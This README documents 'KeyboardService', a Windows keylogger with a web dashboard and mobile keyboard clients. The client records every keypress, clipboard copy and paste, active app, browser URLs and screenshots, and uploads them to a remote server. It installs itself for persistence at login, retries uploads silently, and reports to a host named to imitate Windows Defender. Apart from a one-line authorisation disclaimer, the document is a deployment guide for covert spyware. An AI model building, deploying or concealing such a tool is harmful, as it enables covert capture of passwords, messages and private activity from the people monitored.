# KeyboardService

KeyboardService is a Python web service and desktop client. The client collects typed text, groups it into messages, and sends each message to the web service. The web page displays messages live and shows the device number that sent each one.

Only run the client on computers and accounts you own or are explicitly authorized to monitor.

## How It Works

```text
Keyboard input -> KeyboardService.exe -> POST /api/messages -> app.py -> index.html
```

Each message contains filtered `text`, the original `raw_text`, `device_id`, `device_name`, and `is_pasted`. When typing in a supported browser, the client also captures the exact active page URL as `source_url`; the filtered feed shows that URL with a link-copy button. Every keyboard press is also stored as a `raw_only` log record, including modifiers and non-text keys. The desktop client also records the active app and focused Windows control, keeping that destination while typing and starting a new message when focus moves to another field or app. The device number is a stable 12-character value generated from the computer name. The old separate heartbeat process is no longer used. A message is sent when Enter is pressed or after about 2.5 seconds without typing. Clipboard pastes are sent as separate messages and shown with a `Pasted` label and a different bubble color. The web feed can switch between filtered bubbles and a separate raw keyboard log, and each device is a link to its own message feed.

## Files

- `app.py`: FastAPI web server and message API.
- `client.py`: keyboard listener and message sender.
- `index.html`: live browser feed.
- `mobile_keyboard/`: native Android and iPhone sample keyboard clients.
- `KeyboardService.spec`: PyInstaller configuration.
- `render.yaml`: Render deployment configuration.
- `text.txt`: local message log, ignored by Git.

## Run Locally

Install dependencies:

```powershell
python -m pip install -r requirements.txt
```

Start the website:

```powershell
python app.py
```

Open `http://127.0.0.1:8000`, then start the client in another PowerShell window:

```powershell
python client.py
```

Type a message and press Enter. It should appear in the browser.

## Deploy to Render

1. Push the project to GitHub. `text.txt` is ignored by `.gitignore`.
2. Create a Render Web Service from the repository.
3. Render uses `render.yaml` with these commands:
   - Build: `pip install -r requirements.txt`
   - Start: `gunicorn -k uvicorn.workers.UvicornWorker app:app --bind 0.0.0.0:$PORT`
4. Open the Render service URL in a browser.

Make sure the deployed service contains the latest `app.py` and `index.html`.

## Configure Telegram Uptime Notifications

Create a Telegram bot with BotFather, then send it a message from the chat where
you want uptime notifications. Retrieve that chat's numeric ID and add these
secret environment variables in Render:

```text
TELEGRAM_BOT_TOKEN=your-bot-token
TELEGRAM_CHAT_ID=your-chat-id
BUY_ME_A_COFFEE_URL=https://buymeacoffee.com/yourusername
```

The service sends an online notification at startup and a health heartbeat
every 15 minutes. To change the interval, add
`TELEGRAM_UPTIME_INTERVAL_SECONDS` with a value of at least 60. Telegram
notifications are optional and do not affect the health endpoint or service
startup if they fail. Repeated online notifications indicate that the Render
process is restarting; check the service event and error logs in Render.

The Telegram bot menu includes `/start`, `/help`, `/status`, `/devices`,
`/messages`, and `/support`. `/uptime` remains an alias for `/status`, and
`/buymeacoffee` remains an alias for `/support`. `/status` reports service
health and uptime, `/devices` lists device names, IDs, online state, and last
seen time, and `/messages` reports stored-message totals by device without
sending captured message contents to Telegram. Set
`BUY_ME_A_COFFEE_URL` to your real support page before deploying. The web link
and Telegram command use that same URL. For multiple support methods, use the
same variable with semicolon-separated `name=value` entries:

```text
BUY_ME_A_COFFEE_URL=M-Pesa=0712345678;OKX USDT=your-okx-wallet;Binance USDT=your-binance-wallet
```

Each configured method appears in the support list with a copy button.

When device presence tracking is enabled, Telegram also reports device online
and offline transitions. These alerts include only the device name and ID, not
captured message contents.

For alerts when the service is completely unreachable, configure an external
uptime monitor to check `/health`; a stopped service cannot send its own Telegram
message.

## Configure Supabase Storage

Create a free Supabase project and run this in the Supabase SQL Editor:

```sql
create table public.messages (
   id bigint primary key,
   text text not null,
   device_id text not null default 'unknown',
   device_name text not null default 'Unknown device',
   app_name text not null default 'Unknown app',
   time bigint not null,
   is_pasted boolean not null default false,
   created_at timestamptz not null default now()
);

create index messages_time_idx on public.messages (time desc);
```

If the table already exists, add the new column once:

```sql
alter table public.messages
add column if not exists app_name text not null default 'Unknown app';

alter table public.messages
add column if not exists is_pasted boolean not null default false;

alter table public.messages
add column if not exists is_copied boolean not null default false;

alter table public.messages
add column if not exists raw_text text not null default '';

alter table public.messages
add column if not exists raw_only boolean not null default false;

alter table public.messages
add column if not exists source_url text not null default '';

update public.messages
set raw_text = text
where raw_text = '';
```

Run [migrations/003_add_raw_message_text.sql](migrations/003_add_raw_message_text.sql) and [migrations/004_add_raw_only_flag.sql](migrations/004_add_raw_only_flag.sql) in Supabase before deploying the updated client. Older messages use their filtered text as the raw fallback.

Run [migrations/006_add_source_url.sql](migrations/006_add_source_url.sql) in Supabase before deploying the updated client. Existing messages keep an empty source URL.

Run [migrations/010_create_screenshots_storage.sql](migrations/010_create_screenshots_storage.sql) before using the per-device Screenshot button. Add `SUPABASE_URL` and `SUPABASE_SERVICE_ROLE_KEY` to Render; screenshots are stored in the private `screenshots` bucket and metadata is stored in `public.screenshots`.

To rebuild the messages table and remove legacy per-keystroke rows, run
[migrations/007_rebuild_messages_table.sql](migrations/007_rebuild_messages_table.sql)
in Supabase. It preserves completed messages, normalizes empty raw text to the
filtered text, and does not modify the separate `raw_batches` table.

Run [migrations/005_add_raw_batches.sql](migrations/005_add_raw_batches.sql) to
create the separate `raw_batches` table. The desktop client groups raw keyboard
events into ten-second gzip-compressed batches with millisecond timestamps,
device ID, application name, and session ID. Failed batch uploads are retained
locally in `%LOCALAPPDATA%\KeyboardService\pending_raw_batches.json` until the
server accepts them. The filtered `messages` table no longer receives new
per-key raw rows.

The desktop client records `Ctrl+C` as a separate copied message and `Ctrl+V`
as a pasted message. The web feed uses different bubble styles for each.

Copy the Supabase PostgreSQL connection string into Render as the secret environment variable:

```text
DATABASE_URL=your-supabase-connection-string
```

When `DATABASE_URL` is set, the server loads and saves messages in Supabase. Without it, local development uses `text.txt` as a fallback.

## Run the Packaged Client

Use the exact URL shown by Render:

```powershell
./dist/KeyboardService.exe
```

The Render URL is embedded in the executable, so no `.env` file or terminal variables are required.

Windows browsers do not allow a website to silently launch a downloaded
executable. Open `KeyboardService.exe` once after downloading it; the client registers
itself to launch automatically when you sign in to Windows from then on. On its
first run, the packaged client copies itself to
`%LOCALAPPDATA%\KeyboardService\KeyboardService.exe`, starts that installed copy, and uses
the installed path for future logins. The downloaded file only needs to be
opened once.

## Build the Executable

```powershell
taskkill /F /IM KeyboardService.exe /T 2>$null
python -m PyInstaller --clean --noconfirm KeyboardService.spec
```

Output: `dist/KeyboardService.exe`

## Troubleshooting

If the website is live but empty, check the client URL:

```powershell
echo $env:KEY_FEED_URL
```

It must be `https://windows-defender-cf8n.onrender.com`. Also check `https://windows-defender-cf8n.onrender.com/health`; it should return JSON containing `"ok": true`. Restart the client, type a message, and press Enter.

The service keeps the latest 200 messages in memory. Configure Supabase as described above so messages survive Render restarts and redeploys. `text.txt` is only the local fallback and is ignored by Git.

## Configure Device Presence

Run this SQL in Supabase to retain every client that has started and its latest
heartbeat:

```sql
create table public.devices (
   device_id text primary key,
   device_name text not null default 'Unknown device',
   last_seen bigint not null,
   started_at bigint not null,
   joined_at bigint not null default (extract(epoch from now()) * 1000)::bigint
);

create index devices_last_seen_idx on public.devices (last_seen desc);
```

If the `devices` table already exists, add the permanent first-joined date:

```sql
alter table public.devices
add column if not exists joined_at bigint;

update public.devices d
set joined_at = coalesce(
   (select min(m.time) from public.messages m where m.device_id = d.device_id),
   d.started_at
)
where d.joined_at is null;

alter table public.devices
alter column joined_at set not null;
```

The desktop client sends a heartbeat every 30 seconds. It also marks itself
offline when it exits gracefully, so the dashboard does not wait for the 90
second heartbeat timeout. `GET /api/devices` returns all known devices with
`online: true` when the client is active and its last heartbeat was within 90
seconds, plus `uptime_seconds` for each client's current session and `joined_at`
for the first recorded registration. Offline devices retain the uptime from
their last session.

If an upload fails, the desktop client stores it in
`%LOCALAPPDATA%\KeyboardService\pending_messages.json` and retries it every 30
seconds without printing retry errors on the PC. After a retry succeeds, the
server sends Telegram a notification containing only the device name and ID.
The file is removed after all pending messages are accepted.

## API Endpoints

- `GET /`: web feed.
- `GET /messages`: stored messages; pass `device_id` to select one device.
- `GET /events`: live Server-Sent Events stream.
- `POST /api/messages`: accepts `text`, optional `raw_text` and `raw_only`, `device_id`, `device_name`, `app_name`, and `is_pasted`.
- `POST /api/raw-batches`: stores a compressed raw-event batch in Supabase.
- `GET /api/raw-history`: returns raw batches filtered by device, session, and time range.
- `GET /api/devices`: devices that have sent messages.
- `POST /api/devices/heartbeat`: registers a client and updates its presence.
- `POST /api/devices/offline`: marks a client offline on graceful shutdown.
- `GET /health`: service status and message count.